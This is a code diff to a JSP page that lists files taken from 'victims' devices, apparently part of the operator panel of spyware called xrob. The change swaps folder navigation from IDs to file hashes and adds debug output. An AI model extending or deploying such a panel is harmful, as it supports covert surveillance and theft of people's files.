@@ -1,10 +1,12 @@
-<%@ page import="com.theah64.xrob.api.models.Delivery" %>
+<%@ page import="com.theah64.xrob.api.database.tables.ClientVictimRelations" %>
+<%@ page import="com.theah64.xrob.api.database.tables.Deliveries" %>
+<%@ page import="com.theah64.xrob.api.database.tables.Files" %>
+<%@ page import="com.theah64.xrob.api.database.tables.Victims" %>
+<%@ page import="com.theah64.xrob.api.models.File" %>
 <%@ page import="com.theah64.xrob.api.models.Victim" %>
+<%@ page import="com.theah64.xrob.api.utils.clientpanel.HtmlTemplates" %>
 <%@ page import="com.theah64.xrob.api.utils.clientpanel.PathInfo" %>
 <%@ page import="java.util.List" %>
-<%@ page import="com.theah64.xrob.api.utils.clientpanel.HtmlTemplates" %>
-<%@ page import="com.theah64.xrob.api.database.tables.*" %>
-<%@ page import="com.theah64.xrob.api.models.File" %>
 <%--
   Created by IntelliJ IDEA.
   User: theapache64
@@ -43,7 +45,13 @@
 
             final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 1, PathInfo.UNLIMITED);
             final String victimCode = pathInfoUtils.getPart(1);
-            final String fileParentId = pathInfoUtils.getLastPart("0");
+            final String fileHash = pathInfoUtils.getLastPart(null);
+            System.out.println("FileHash : " + fileHash);
+            String fileParentId = Files.getInstance().get(Files.COLUMN_FILE_HASH, fileHash, Files.COLUMN_FILE_ID);
+            System.out.println("FileParentId : " + fileParentId);
+            if (fileParentId == null) {
+                fileParentId = "0";
+            }
 
             final Victims victimsTable = Victims.getInstance();
             final Victim theVictim = victimsTable.get(Victims.COLUMN_VICTIM_CODE, victimCode);
@@ -94,7 +102,7 @@
                             if (file.isDirectory()) {
                         %>
                             <abbr title="<%=file.getAbsoluteParentPath()%>">
-                                <a href="/client/victim/files/<%=victimCode+"/"+file.getAbsoluteParentPath()+"/"+file.getId()%>"><%=file.getFileName()%>
+                                <a href="/client/victim/files/<%=victimCode+file.getAbsoluteParentPath()+(file.getAbsoluteParentPath().equals("/") ? "" : "/")+file.getFileName()+"/"+file.getFileHash()%>"><%=file.getFileName()%>
                                 </a>
                             </abbr>
 
